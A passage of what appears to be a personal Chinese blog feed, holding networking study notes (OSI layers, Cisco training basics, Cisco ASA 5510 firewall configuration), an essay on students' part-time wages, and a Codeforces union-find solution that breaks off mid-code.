id="会话层">会话层：</h4><p>创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p><h4 id="传输层">传输层：</h4><p>数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p><h4 id="网络层">网络层：</h4><p>IP选址及路由选择。通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p><h4 id="数据链路层">数据链路层：</h4><p>提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p><h4 id="物理层">物理层：</h4><p>管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p><h2 id="协议数据单元protocol-data-unitpdu">协议数据单元（Protocol DataUnit，PDU）</h2><p>网路的对等实体传送的讯息单元，包括了控制讯息，地址讯息，或者数据。<br>在分层协议系统里，在指定的协议层上传送的数据单元，包含了该层的协议控制讯息和用户讯息。<br>在OSI模型系统里，PDU和最底下四层相关。</p><p>物理层（一层）PDU指数据位（Bit）。<br>数据链路层（二层）PDU指数据帧（Frame）。<br>网络层（三层）PDU指数据包（Packet）。<br>传输层（四层）PDU指数据段（Segment）。<br>第五层或以上为数据（data）。在特定的上下文情况下，一个特定层的PDU有时可以代表这个层。</p><h3 id="pdu">PDU</h3><p>协议层的协议在对等层之间交换的信息叫协议数据单元。</p><h3 id="数据封装encapsulation">数据封装（Encapsulation）</h3><p>封装数据要通过网络进行传输，要从高层一层一层的向下传送，如果一个主机要传送数据到别的主机,先把数据包装到一个特殊协议报头中，这个过程叫封装。</p><h3 id="数据解封装">数据解封装</h3><p>数据被封装并通过网络传输后，接收设备将删除添加的信息，并根据报头中的信息决定如何将数据沿协议栈向上传给合适的应用程序。</p><h3 id="数据的封装与解封装过程">数据的封装与解封装过程</h3><p>数据传输过程</p><h2 id="tcpip">TCP/IP</h2><h3 id="位">位</h3><p>一位就是一个数字,要么是1,要么是0。</p><h3 id="字节">字节</h3><p>一个字节可以有7位或8位,这取决于是否使用了<strong>检验位</strong>。一般将一个<strong>字节（Byte）</strong>假定为8位。</p><h3 id="八位位组">八位位组</h3><p>就是8位（bit）,是一个最基本的8位二进制数。</p><h3 id="网络地址">网络地址</h3><p>它是在将数据包发送到远程网络的路由中使用的名称，例如：<code>10.0.0.0</code>,<code>172,16.0.0</code> 和 <code>192.168.10.0</code>。</p><h3 id="广播地址">广播地址</h3><p>被应用程序和主机用来将信息发送给网络上所有结点的地址,我们称之为广播地址。<br>例如：<code>255.255.255.255</code>用于指向所有网络、所有结点；<code>172.16.255.255</code> 指向网络<code>172.16.0.0</code> 上的所有子网和主机；而<code>10.255,255.255</code> 指向网络 <code>10.0.0.0</code>上的所有子网和主机。</p>]]></content>
      
      
      <categories>
          
          <category> 思科人才孵化项目笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的身价是多少</title>
      <link href="/2022/03/23/ni-de-shen-jie-shi-duo-shao/"/>
      <url>/2022/03/23/ni-de-shen-jie-shi-duo-shao/</url>
      
        <content type="html"><![CDATA[<h1 id="你的身价是多少">你的身价是多少</h1><p>在校期间做些兼职赚钱越来越容易。我经常可以听到同学们不无羡慕地议论某某同学在外头打工挣了多少钱。</p><p>看着周围朋友们一个个都有钱了，不少同学也都行动起来：<br>有本事的去跨国大企业，拿着连全职员工都嫉妒的薪水，还能捞到一份不错的工作经验；<br>没本事的也可以通过学校安排勤工助学，或者出去做家教。</p><p>的确，在读期间能做一些兼职自食其力，月薪几千是一件既让人自豪，又非常实惠的事情。但我们现在真的是时候“投笔从职”吗？</p><p>我不知道各位林大学生是否考虑过<strong>高中毕业直接参加工作</strong>。<strong>没有</strong>？<br>那么是什么让我们削尖了脑袋参加高考，挤进大学呢？<br>我想“学习好”，或者“爱学习”并不是借口，因为我们当中很少有人会因为“热爱游戏”而投身职业电子竞技的军团，也不会因为“善于做家务”而放弃大学去应聘小保姆。</p><p>从本质上说，绝大部分同学们之所以选择大学毕业后再参加工作，是看上了更加体面的薪资待遇——<strong>大学毕业之后，我们的劳动会变得更有价值</strong>。在此，请不要提及所谓“劳动平等”之类的错误观点。劳动所创造的价值从来都不是均等的，而且不同行业的劳动早已明码标价了。</p><p>在这里我无意进行详尽的行业调查，仅举出身边的一些案例供参考：</p><p>• 一般企业运营管理培训讲座，主讲人出场费约为<strong>5000 −10000元</strong>一场</p><p>•跨国投资银行（例子中为渣打）分析师月薪约合<strong>70000元</strong>人民币</p><p>•一般一所美国大学提供的奖学金约合人民币每月<strong>15000元</strong></p><p>• 北京新东方讲师的课时工资约为<strong>500 − 1000元</strong></p><p>• 我校应届毕业生的平均月薪为<strong>5000元</strong></p><p>•高中生家教的市价约为每课时<strong>40元</strong>，但有朋友指出，家教工作中，实际备课、来回路程所花时间与上课相当，甚至更长。</p><p>• 我校勤工助学在不同岗位价格略有差异，基本工资按<strong><a href="https://xxgk.nefu.edu.cn/system/_content/download.jsp?urltype=news.DownloadAttachUrl&amp;owner=1680665402&amp;wbfileid=4656725">《东北林业大学关于印发勤工助学实施细则（2018年修订）》</a></strong>核发，每小时<strong>8元</strong></p><p>• <strong>哈尔滨市最低工资标准为1860元/月</strong></p><p>我根本不需要列出更为悬殊的价码差距。这样的现状已经足够那些正在（或者正准备）投身打工大潮的同学对号入座，反观自己劳动的档次。<br>作为一名大学生，我们要对自己的能力和将来的身价有一份清醒而客观的期望。在面对各种兼职的时候，我们必须先说服我们的自尊：</p><p><strong>参加这样的工作，我们是不是正在以过于低廉的价格出卖自己的劳动力？</strong></p><p>在林大，大多数同学家中没有许多房子也没有许多车，但他们是幸运的，至少有家庭可以负担他们在校期间的开销，不需要同学们为了筹措生活费，一边上学一边廉价地出卖自己宝贵的时间。</p><p><strong>所以，对于生计无虞的同学们，我们更应该做的不是为了蝇头小利在最底层的劳动中苦苦挣扎，而是应当积极地利用这份时间来提高我们的身价，为今后出卖高价值劳动创造机会。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 有感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思科人才孵化项目 Day1</title>
      <link href="/2022/03/22/si-ke-fu-hua-xiang-mu-day1/"/>
      <url>/2022/03/22/si-ke-fu-hua-xiang-mu-day1/</url>
      
        <content type="html"><![CDATA[<h1 id="思科孵化项目-day1">思科孵化项目 Day1</h1><h2 id="计算机网络基本概念">计算机网络基本概念</h2><p>我们在CCNA课程中学习的，主要是计算机网络。目的是<strong>快速传递信息</strong>。</p><p>计算机小型化后，快速投入生产。</p><p>产生了不同的客户类型：</p><ul><li>消费级客户 （家庭与个人）</li><li>商业型客户</li><li>企业级客户</li></ul><h2 id="计算机信息传递的需求">计算机信息传递的需求</h2><p>业务上服务器 / 业务上云：</p><p>数据资料脱离本地，使得多人可以同时使用业务</p><p>网络目的：以<strong>共享信息</strong>为目的，使用<strong>介质</strong>，将计算机<strong>连接</strong>在一起</p><h3 id="介质">介质</h3><h4 id="无线用户">无线用户</h4><p>使用无线AP，WLAN，…接入网络</p><p>Pro:</p><ul><li>易于连接，部署快速，成本低</li></ul><p>Con:</p><ul><li>范围较小</li></ul><h4 id="有限家庭用户">有限家庭用户</h4><blockquote><p><strong>WAN:广域网</strong></p><p><strong>LAN:局域网</strong></p></blockquote><p>LAN:相对有限 WAN:范围较大</p><h3 id="上机试验">上机试验</h3><blockquote><p>试验环境：Cisco 1921</p></blockquote><p><img src="https://googles.plus/images/loading.gif" data-original="https://s1.ax1x.com/2022/03/23/q1523d.png"></p><p>执行 <code>traceroute</code>后，显示了数据包从本地(<code>localhost</code>)到<code>dns.google(8.8.8.8)</code>的路径。<br>从第5行后，开始为非局域网IP。进入了公网区域，从第13跳开始离岸，在第17跳抵达目标IP。</p><h4 id="企业环境">企业环境</h4><p>业务多样，需求繁多，对安全性有要求。</p><p>路由器：选择最佳路由、负荷分担、链路备份、路由信息交换（RIP, BGP,OSPF, IS-IS）、NAT<br>交换机：三层交换机和二层交换机，其中<strong>三层交换机</strong>可以配置下一跳<br>防火墙：位于两个或以上网络间，实行网络间访问或控制，隔开了信任区域与非信任区域</p><hr><p>很多网络出口既有路由器，还有防火墙，路由器负责路由、NAT等基础功能，防火墙负责应用层安全检测。会存在如下两种部署架构，如何选择呢？</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://s1.ax1x.com/2022/03/22/qQeMfe.jpg"></p><p>其实最早网络用的基本是：第一种架构。原因很简单，当年以太网还没这么流行，广域网接口有ATM、POS、E1、T1等各种五花八门的接口，这些接口防火墙都不支持，只能接在路由器上。</p><p>随着时代发展，运营商网络由SDH过渡到MSTP平台，以太网接入开始普及，使用第二种架构也无可厚非了。</p><h4 id="城际网络">城际网络</h4><p>基于WAN，起因是LAN被连接到一起。</p><p>连接到互联网，绝大多数情况都需要经过运营商（ISP），其连接到骨干网（Backbone）。</p><h4 id="存储">存储</h4><p>允许同时大量访问（负载均衡、高并发）</p><p>安全：</p><ul><li>容错：发生故障时，系统还能继续运行</li><li>高可用： 系统能够比正常时间更久地保持一定的运行水平</li><li>灾备：发生灾难时恢复业务的能力</li></ul><h2 id="网络技术">网络技术</h2><h3 id="家用路由器">家用路由器</h3><p>简单路由+简单交换</p><p>路由：上行接口进行拨号(PPPoE)，通过<strong>DHCP/DHCPv6/SLAAC</strong>获取<strong>IP</strong>。<br>此时路由功能没有充分体现，仅为出接口，重定向出站数据到<strong>WAN</strong>口。</p><h3 id="路由器">路由器</h3><p>接口较少，通常为4个：</p><ul><li>2x <strong>GigabitEthernet/Ethernet/FastEthernet0/0-1</strong></li><li>Console 串行调试口，用于机房调试</li><li>AUX 用于远程调试，速率较低</li></ul><h3 id="三层交换机">三层交换机</h3><ul><li>由硬件结合实现数据的高速转发。</li><li>简单的二层交换机和路由器的叠加，三层路由模块直接叠加在二层交换的高速背板总线上，突破了传统路由器的接口速率限制，速率可达Gbps。算上背板带宽，这些是三层交换机性能的两个重要参数。</li><li>简洁的路由软件使路由过程简化。</li><li>大部分的数据转发，除了必要的路由选择交由路由软件处理，都是又二层模块高速转发，路由软件大多都是经过处理的高效优化软件，并不是简单照搬路由器中的软件。</li></ul><p>路由器与三层交换机的区别：</p><p>路由器是三层设备，可是三层交换机却可以同时工作在三层和二层的。</p><ol type="1"><li><p>路由器与三层交换机的主要功能不同。路由器则是利用IP地址（网络地址）来确定数据转发的地址，而三层交换机是利用MAC地址（物理地址）来确定转发数据的目的地址。虽然三层交换机与路由器都具有路由功能，但不能因此而把它们等同起来。路由器不仅具有路由功能，还提供了交换机端口、硬件防火墙附加功能，其目的是使设备适用面更广、使其更加实用。三层交换机也一样，主要功能仍是数据交换，只不过它是具备了一些基本的路由功能的交换机。三层交换机同时具备了<strong>数据交换</strong>和<strong>路由转发</strong>两种功能，但其主要功能还是<strong>数据交换</strong>；而路由器仅具有路由转发这一种主要功能。路由器则是利用IP地址（网络地址）来确定数据转发的地址，而三层交换机是利用MAC地址（物理地址）来确定转发数据的目的地址。</p></li><li><p>路由器与三层交换机的转发依据不同。路由器则是利用IP地址（网络地址）来确定数据转发的地址，而三层交换机是利用MAC地址（物理地址）来确定转发数据的目的地址。</p></li><li><p>路由器与三层交换机的应用范围不同。三层交换机的路由功能通常比较简单，因为它所面对的主要是简单的局域网连接。特性远没有路由器那么复杂。它用在局域网中的主要用途还是提供快速数据交换功能，满足局域网数据交换频繁的应用特点。而路由器则不同，虽然也适用于局域网之间的连接，但它的路由功能更多的体现在不同类型网络之间的互联上，如局域网与广域网之间的连接、不同协议的网络之间的连接等，优势在于<strong>选择最佳路由、负荷分担、链路备份及和其他网络进行路由信息的交换</strong>等。另外，为了与各种类型的网络连接，路由器的接口类型非常丰富，而三层交换机则一般<strong>仅同类型的局域网接口</strong>，非常简单。</p></li><li><p>路由器与三层交换机的性能不同。路由器和三层交换机在数据包交换操作上存在着明显区别。路由器一般由基于<strong>网络处理器或多核的路由引擎</strong>执行数据包交换。而三层交换机通过<strong>硬件</strong>执行数据包交换。三层交换机在对第一个数据包送控制面进行路由查找后，它将会产生一个供数据面查找的MAC地址与IP地址的映射表，当同样的数据流再次通过时，将根据此表查表通过而不是再次送控制面查路由（即“一次路由，多次交换”）。提高了数据包转发的效率。三层交换机的路由查找是针对数据流的，它利用<strong>缓存技术</strong>，很容易利用ASIC技术来实现，因此，可以大大节约成本，并实现快速转发。而路由器的转发采用<strong>最长匹配</strong>的方式，实现复杂，一般采用价格高昂的网络处理器或多核处理器实现，并且路由表数目庞大，成本相当高。</p></li><li><p>路由器与三层交换机的接口不同。为了能够适应各种类型的网络连接，路由器支持多种不同的有线传输介质，如光纤、电话线、串行线缆等，其接口类型种类繁多，如以太网接口、令牌环接口、FDDI接口、E1/T1接口、WLAN网卡等；而三层交换机一般只有以太网接口，如RJ-45接口、光纤接口等。</p></li></ol><p><strong>总结：</strong></p><blockquote><p>二层交换机：基于MAC地址</p><p>三层交换机：具有VLAN功能 ，交换和路由，基于IP，就是网络。</p></blockquote><h3 id="网络控制">网络控制</h3><h4 id="qos-quality-of-service">QoS (Quality of Service)</h4><p>QoS是一种控制机制，它提供了针对不同用户或者不同数据流采用相应不同的优先级，或者是根据应用程序的要求，保证数据流的性能达到一定的水准</p><h2 id="网络的特性">网络的特性</h2><h3 id="网络的拓扑topology">网络的拓扑（Topology）</h3><ul><li>设备的类型</li><li>设备连接的方式</li><li>设备的IP地址</li><li>设备的角色</li><li>图例：指示图标代表了什么设备</li></ul><p>拓扑分为<strong>物理拓扑</strong>和<strong>逻辑拓扑</strong></p><p>物理拓扑：网络如何实际连接<br>逻辑拓扑：不关注线缆、IP地址，注重<strong>如何转发</strong></p><h3 id="比特率和带宽bitrate-and-bandwidth">比特率和带宽（Bitrate andBandwidth）</h3><p>衡定网络的转发能力</p><p>每秒转发多少数据（Mbps, GBps），最大流量</p><h3 id="可用性availability">可用性（Availability）</h3><p>业务需要一直可用, Uptime以年计。</p><h3 id="可靠性reliability">可靠性（Reliability）</h3><p>平均故障间隔（MTBF, Mean Time Between Failure）</p><p><span class="math inline">\({\rm{Availability} } = \frac{ {{\rm{uptime} } } }{ { {\rm{uptime~+~downtime} } } }\)</span></p><p><span class="math inline">\({\rm{Reliability~Mean~Time~Between~Failures~(MTBF)}} = \frac{ { {\rm{time~in~service} } } }{ { {\rm{number~of~failures} } }}\)</span></p><p><span class="math inline">\({\rm{Device\_X~Availability} } =\frac{\rm{total~uptime~in~a~day~in~minutes}}{\rm{total~minutes~in~a~day} }*{\rm{100} }\)</span></p><p><span class="math inline">\({\rm{Device\_X~Reliability~MTBF} } =\frac{\rm{total~minutes~in~a~day} }{\rm{number~of~failures~in~a~day}}\)</span></p><h3 id="可扩展性scalability">可扩展性（Scalability）</h3><p>对未来业务增长的适应能力。</p><h3 id="安全性security">安全性（Security）</h3><p>敏感数据的访问控制。</p><h3 id="qos-quality-of-service-1">QoS (Quality of Service)</h3><p>QoS是一种控制机制，它提供了针对不同用户或者不同数据流采用相应不同的优先级，或者是根据应用程序的要求，保证数据流的性能达到一定的水准</p><h3 id="成本cost">成本（Cost）</h3><p>建设成本和管理成本</p><h3 id="虚拟化virtualization">虚拟化（Virtualization）</h3><p>SDN，软件定义网络。它利用OpenFlow协议将路由器的控制平面（controlplane）从数据平面（dataplane）中分离，改以软件方式实现，从而使得将分散在各个网络设备上的控制平面进行集中化管理成为可能。</p><h2 id="网络结构">网络结构</h2><ul><li>总线形（Bus Topology）:有坏点，下游Down</li><li>环形（Ring Topology）：最长数据传输距离过长</li><li>星形（Star/DaisyTopology）：又称菊花链，故障互不影响，但部署成本较高</li><li>网状（Mesh Topology）:高度互联和全互联，成本较高</li></ul><h3 id="总线型">总线型</h3><p><img src="https://googles.plus/images/loading.gif" data-original="https://s1.ax1x.com/2022/03/23/q1kLVK.jpg"></p><ul><li>缺点：有一个坏点，其他节点就无法通信，称为单点故障。</li></ul><h3 id="环形拓扑">环形拓扑</h3><p><img src="https://googles.plus/images/loading.gif" data-original="https://s1.ax1x.com/2022/03/23/q1ZMqI.jpg"></p><p>节点之间两两之间链接，形成一个闭合的环路。遵从一定的方向。</p><p>缺点也很明显：相邻节点有可能无法寻得最短路径，而且如果中间节点宕机，整个系统就无法工作。而且想要加入节点的话需要先断开两个节点之间，<strong>但这种环形拓扑保证了安全性</strong>。</p><h3 id="星形拓扑">星形拓扑</h3><p>星形拓扑只有一个中心节点，其他都是非中心节点。节点之间进行通信必须要依赖中心节点。星型拓扑部署简单，只需和中心节点连接即可，<strong>搭建网络所需工作相对较少，非中心节点负载不高</strong>，其中非中心节点宕机不会影响其他节点通信。但一旦中心节点宕机，非中心节点也会无法工作。</p><h3 id="网状拓扑">网状拓扑</h3><p>网状拓扑采用部分互联的方式。有些节点比较重要，需要有其他的节点跟他链接，我们就把认为比较重要的节点连接在一起就可以，另外一些不重要的节点连接在一起。网络拓扑的稳定性很高，任意一个节点坏了，不会影响其他节点。与星拓扑不同，星拓扑中心不可坏。它比星好的是没有中心点。但是搭建比较复杂，需要先分析哪些重要哪些不重要。</p><h2 id="用户流量类型">用户流量类型</h2><ul><li>Data（数据流量）：应用之间互相挤占带宽，下载流量的带宽呈锯齿状爆发式流量</li><li>Voice（语音流量）：带宽峰值比较平滑，比较平稳，对延迟丢包敏感</li><li>Video（视频流量）：带宽峰值呈锯齿状，贪心，会大量占用带宽，对延迟丢包敏感</li></ul>]]></content>
      
      
      <categories>
          
          <category> 思科人才孵化项目笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
            <tag> 网络 </tag>
            
            <tag> 思科孵化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASA 5510 - 年轻人的第一台防火墙</title>
      <link href="/2022/03/18/asa-5510-nian-qing-ren-de-di-yi-tai-fang-huo-qiang/"/>
      <url>/2022/03/18/asa-5510-nian-qing-ren-de-di-yi-tai-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="asa-5510---年轻人的第一台防火墙">ASA 5510 -年轻人的第一台防火墙</h1><h2 id="透明模式">透明模式</h2><h3 id="介绍">介绍</h3><p>透明模式也称为“网桥模式”、“透明桥接模式”。透明模式适用于原网络中已部署好路由器和交换机，用户不希望更改原有的网络，只需要一台防火墙进行安全防护的场景。</p><h3 id="优点">优点</h3><ul><li>易于部署，无需改变网络拓扑结构，无需更改原有的IP编址方案。</li><li>无需修改受保护网络的IP设置。</li><li>无需为进入受保护网络的报文创建NAT规则。</li><li>支持很多在路由模式下支持的特性，比如Failover，NAT（版本8），状态过滤，标准和扩展ACL，CTP，WEB内容过滤，MPF等等。</li><li>允许非IP流量穿越防火墙。默认是拒绝的，比如Appale Talk,IPX,STPBPDUs和MPLS。这些流量可以通过配置Ether-TypeACL而被允许通过透明模式防火墙。</li></ul><h3 id="缺点">缺点</h3><ul><li>只支持2个接口在一个bridge里（8.3后引入bridge-group概念，每一个bridge-group内可以支持多个接口）</li><li>BVI-ip地址必须与连接的网络位于同一子网中</li><li>管理接口不支持作为网桥组成员</li><li>透明模式下必须至少使用一个桥组，数据接口必须属于网桥组</li><li>不能将BVI-IP地址指定为连接设备的默认网关，需要使用ASA另一侧的router指定为默认网关</li><li>最多可以创建250个bridge-group，每个组最大64个接口</li><li>不支持以下特性：<ul><li>DHCP reley</li><li>Dynamic routing protocols</li><li>Dynamic DNS</li><li>Multicast IP routing</li><li>Quality of Service</li><li>VPN termination (except for management traffic)</li><li>从8.2(1)开始，透明防火墙能够支持IPv6</li></ul></li><li>透明墙的业务接口不能配置IP地址，但management接口可以配置(out-of-band)</li><li>也可以在配置全局模式创建管理IP地址（in-band）（8.4之前）</li><li>透明墙可以做NAT,但是不能跑路由协议</li></ul><p>我们这里不开启防火墙的路由功能，仅为二层防火墙。防火墙部署在原有网络的路由器和交换机之间，内网通过原有的路由器上网，防火墙只做安全控制。</p><p>命令：</p><pre class="line-numbers language-none"><code class="language-none">firewall transparent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="基本配置">基本配置</h2><h3 id="配置主机名域名">配置主机名、域名</h3><pre class="line-numbers language-none"><code class="language-none">hostname  [hostname]domain-name  xx.xxhostname Cisco-ASA 5520domain-name ciscosas.com.cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置登陆用户名密码">配置登陆用户名密码</h3><pre class="line-numbers language-none"><code class="language-none">password [password]enable password  [password]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="配置接口路由">配置接口、路由</h3><pre class="line-numbers language-none"><code class="language-none">interface interface_namenameif   [name] name  有三种接口类型 insdie outside dmzsecurity-level  xx(数值) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>数值越大接口安全级别越高</p><p>注：默认inside 100 ,outside 0 ,dmz 介于二者之间</p><h3 id="静态路由">静态路由</h3><pre class="line-numbers language-none"><code class="language-none">route interface_number network mask next-hop-addressroute outside 0.0.0.0 0.0.0.0 210.210.210.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="配置远程管理接入">配置远程管理接入</h3><pre class="line-numbers language-none"><code class="language-none">Telnettelnet {network | ip-address } mask interface_nametelnet 192.168.1.0 255.255.255.0 insidetelnet 210.210.210.0 255.255.255.0 outside <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ssh">SSH</h3><pre class="line-numbers language-none"><code class="language-none">crypto key generate rsa modulus {1024| 2048}             指定rsa系数，思科推荐1024ssh timeout minutesssh version version_numbercrypto key generate rsa modulus 1024ssh timeout 30ssh version 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nat">NAT</h3><pre class="line-numbers language-none"><code class="language-none">nat-controlnat interface_name nat_id local_ip maskglobal interface_name nat_id {global-ip [global-ip] |interface}nat-controlnat inside 1 192.168.1.0 255.255.255.0 global  outside 1 interfaceglobal dmz 1 192.168.202.100-192.168.202.150<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="acl">ACL</h3><pre class="line-numbers language-none"><code class="language-none">access-list list-name standad permit | deny  ip maskaccess-list list-name extendad permit | deny protocol source-ip mask destnation-ip mask port access-group list-name in | out interface interface_name <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果内网服务器需要以布到公网上</p><pre class="line-numbers language-none"><code class="language-none">staic real-interface mapped-interface mapped-ip real-ipstaic (dmz,outside) 210.210.202.100 192.168.202.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>保存配置<br><code>write memory</code></p><p>清除配置<br><code>clear configure (all)</code></p><h2 id="流量控制">流量控制</h2><h3 id="放行icmp包">放行ICMP包</h3><p>ping等命令很多都依靠ICMP协议，为了方便调试，这里放行ICMP相关流量：</p><pre class="line-numbers language-none"><code class="language-none">policy-map global_policy   class inspection_default   inspect icmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者使用</p><pre class="line-numbers language-none"><code class="language-none">access-list OUTSIDE extended permit icmp any4 any4 echo-replyaccess-list OUTSIDE extended permit icmp any4 any4 time-exceededaccess-list OUTSIDE extended permit icmp any4 any4 timestamp-replyaccess-list OUTSIDE extended permit icmp any4 any4 unreachable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="asdm-配置">ASDM 配置</h2><pre class="line-numbers language-none"><code class="language-none">asdm image disk0:/asdm_file_name 指定文件位置interface management 0/0ip address 192.168.1.1 255.255.255.0nameif managementsecurity-level 100no shutdowndhcpd address 192.168.1.2-192.168.1.254 managementdhcpd enable managementhttp server enablehttp 192.168.1.0 255.255.255.0 management<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们用<code>dhcpd</code>为连接至管理接口的设备分配IP<br>经过以上配置就可以用ASDM配置防火墙了。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> 防火墙 </tag>
            
            <tag> ASA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces 1641C</title>
      <link href="/2022/03/15/codeforces-1641c/"/>
      <url>/2022/03/15/codeforces-1641c/</url>
      
        <content type="html"><![CDATA[<h1 id="codeforces-1641c">Codeforces 1641C</h1><h2 id="题意">题意</h2><p>一段区间，几个操作：</p><ul><li>一段区间内全为<strong>0</strong></li><li>一段区间内存在<strong>1</strong></li><li>查询一个点的值是否能被确定，能则输出该值</li></ul><h2 id="solution">Solution</h2><ul><li>树状数组</li><li>并查集（V）</li></ul><h2 id="code">Code</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//</span><span class="token comment">// Created by sfc9982 on 2022/03/15.</span><span class="token comment">//</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iomanip&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;queue&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stack&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cmath&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">200050</span><span class="token punctuation">]</span><span class="token punctuation">,</span> maxv<span class="token punctuation">[</span><span class="token number">200050</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">fa</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> f<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">==</span> x <span class="token operator">?</span> x <span class="token operator">:</span> f<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">fa</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cout<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token keyword">nullptr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> n <span class="token operator">&gt;&gt;</span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        maxv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> op<span class="token punctuation">;</span>        cin <span class="token operator">&gt;&gt;</span> op<span class="token punctuation">;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>op<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            